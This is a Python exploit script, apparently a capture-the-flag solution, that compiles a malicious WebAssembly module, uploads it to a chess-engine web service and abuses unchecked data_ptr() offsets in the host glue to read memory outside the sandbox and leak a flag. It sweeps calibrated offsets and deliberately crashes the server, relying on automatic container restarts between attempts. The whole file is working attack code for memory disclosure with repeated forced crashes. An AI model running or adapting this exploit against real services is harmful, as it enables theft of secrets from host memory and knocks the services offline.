#!/usr/bin/env python3
"""Read WASM memory through unchecked data_ptr() offsets in David."""

from __future__ import annotations

import argparse
import subprocess
import sys
import tempfile
import time
from pathlib import Path

import requests

WAT_TEMPLATE = """(module
  (memory (export "memory") 1)
  (func (export "fen_buffer") (result i32)
    i32.const 0)
  (func (export "best_move") (result i64)
    i64.const {offset})
)
"""

FEN_BUF_OFFSET_IN_BEE_MEMORY = 0x430  # mcu-max.wat: data $.data (i32.const 1072) "avito{...}"
BASE_GAP = 0x104000000  # minimum bee-badger stride: 4GiB reservation + 64MiB (guard before+after)
STEP = 0x04000000  # 64MiB: quantum of intervening malloc-arena/thread-guard allocations

# Each crash selects a new layout. Observed k frequencies: 0≈45%, 1≈7%, 2≈48%.
# Retry 0 and 2 often; a failed read does not eliminate an offset for later runs.
K_SWEEP = [
    0,
    2,
    0,
    2,
    1,
    0,
    2,
    0,
    2,
    1,
    0,
    2,
    3,
    0,
    2,
    1,
    0,
    2,
    4,
    0,
    2,
    1,
    5,
    0,
    2,
    6,
    0,
    2,
    7,
    0,
    2,
    8,
]


def candidate_offsets() -> list[int]:
    """The ordered list of absolute read offsets to try, one per crash-restart."""
    return [BASE_GAP + k * STEP + FEN_BUF_OFFSET_IN_BEE_MEMORY for k in K_SWEEP]


# Default offset for k=0.
LEAK_TARGET = BASE_GAP + FEN_BUF_OFFSET_IN_BEE_MEMORY  # 0x104000430


def build_badger_wasm(offset: int) -> bytes:
    """Compile the malicious BADGER_PLAYER module with wat2wasm.

    Args:
        offset: absolute i64 value best_move() should return, interpreted by
            the vulnerable Python glue as ``data_ptr(badger_store) + offset``.

    Returns:
        The compiled wasm module bytes.
    """
    wat = WAT_TEMPLATE.format(offset=offset)
    with tempfile.TemporaryDirectory() as tmp:
        wat_path = Path(tmp) / "badger.wat"
        wasm_path = Path(tmp) / "badger.wasm"
        wat_path.write_text(wat)
        subprocess.run(["wat2wasm", str(wat_path), "-o", str(wasm_path)], check=True)
        return wasm_path.read_bytes()


def _attempt(base_url: str, wasm_bytes: bytes) -> str:
    """Run one upload+leak attempt; raises requests exceptions on failure."""
    session = requests.Session()

    up = session.post(
        base_url.rstrip("/") + "/api/upload",
        files={"file": ("badger.wasm", wasm_bytes, "application/wasm")},
        timeout=10,
    )
    up.raise_for_status()

    # fields[1] must be 'b' to route to BADGER_PLAYER; the whole string is
    # otherwise irrelevant (fen_buffer() safely returns 0, inside our own
    # memory, so the write side of best_move() never goes OOB).
    res = session.get(
        base_url.rstrip("/") + "/api/best-move",
        params={"fen": "x b"},
        timeout=10,
    )
    res.raise_for_status()
    return res.json()["best_move"]


def _wait_until_up(base_url: str, timeout_s: float = 30.0) -> None:
    """Poll base_url until it answers, e.g. after a crash-induced container restart."""
    deadline = time.monotonic() + timeout_s
    while time.monotonic() < deadline:
        try:
            requests.get(base_url, timeout=2)
            return
        except requests.exceptions.RequestException:
            time.sleep(1)


def leak_flag(base_url: str, offsets: list[int] | None = None, retries: int = 24) -> str:
    """Upload the malicious module and trigger the OOB read, sweeping candidate
    offsets across crash-restarts.

    The (offset - BEE fen_buf) relationship is
    ``BASE_GAP + k*STEP`` with k a boot-time-random small integer (measured
    {0,1,2}; distribution ~45/7/48%). We cannot detect k in-band without
    crashing, so we cycle the ``candidate_offsets()`` list -- ordered by
    observed frequency -- firing one per boot. A miss dereferences an unmapped
    guard page and SIGSEGVs the whole process; docker-compose.yml's
    ``restart: unless-stopped`` brings the container back with a fresh random
    k a couple seconds later, and we advance to the next candidate.

    With p(hit) ~0.45 for the most likely single candidate, and independent k
    per boot, convergence is typically 1-3 restarts and P(success within the
    retry budget) is ~1. See david_writeup.md #3.

    Args:
        base_url: root URL of a live goliath instance (after the reCAPTCHA gate).
        offsets: ordered candidate offsets to sweep (defaults to
            ``candidate_offsets()``).
        retries: how many crash-and-restart cycles to tolerate.

    Returns:
        The leaked NUL-terminated string read starting at the OOB pointer
        (the flag when the fired candidate matches this boot's k and
        BEE_PLAYER's fen_buf has not been overwritten by a 'w'-side call).
    """
    if offsets is None:
        offsets = candidate_offsets()

    last_exc: Exception | None = None
    for attempt in range(retries):
        offset = offsets[attempt % len(offsets)]
        wasm_bytes = build_badger_wasm(offset)
        try:
            result = _attempt(base_url, wasm_bytes)
        except requests.exceptions.RequestException as exc:
            last_exc = exc
            print(
                f"[attempt {attempt + 1}/{retries}] offset=0x{offset:x} "
                f"likely crashed on an OOB guard page ({exc.__class__.__name__}); "
                f"waiting for restart...",
                file=sys.stderr,
            )
            _wait_until_up(base_url)
            continue
        if result.startswith("avito{"):
            print(
                f"[+] hit with offset=0x{offset:x} (k={(offset - LEAK_TARGET) // STEP})",
                file=sys.stderr,
            )
            return result
        # Non-crash, non-flag: landed on a mapped-but-wrong page (rare for our
        # candidates, which otherwise hit PROT_NONE). Treat as a miss and try
        # the next candidate without waiting for a restart.
        print(
            f"[attempt {attempt + 1}/{retries}] offset=0x{offset:x} returned "
            f"non-flag {result!r:.48}; advancing candidate.",
            file=sys.stderr,
        )
    raise RuntimeError(f"all {retries} attempts failed") from last_exc


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", required=True, help="live goliath instance base URL")
    parser.add_argument(
        "--offset",
        type=lambda s: int(s, 0),
        default=None,
        help="pin a single OOB read offset (default: sweep the calibrated k-candidate list)",
    )
    parser.add_argument("--retries", type=int, default=24, help="crash-restart retry budget")
    args = parser.parse_args()

    offsets = [args.offset] if args.offset is not None else None
    flag = leak_flag(args.url, offsets, args.retries)
    print(flag)
    return 0 if flag.startswith("avito{") else 1


if __name__ == "__main__":
    sys.exit(main())
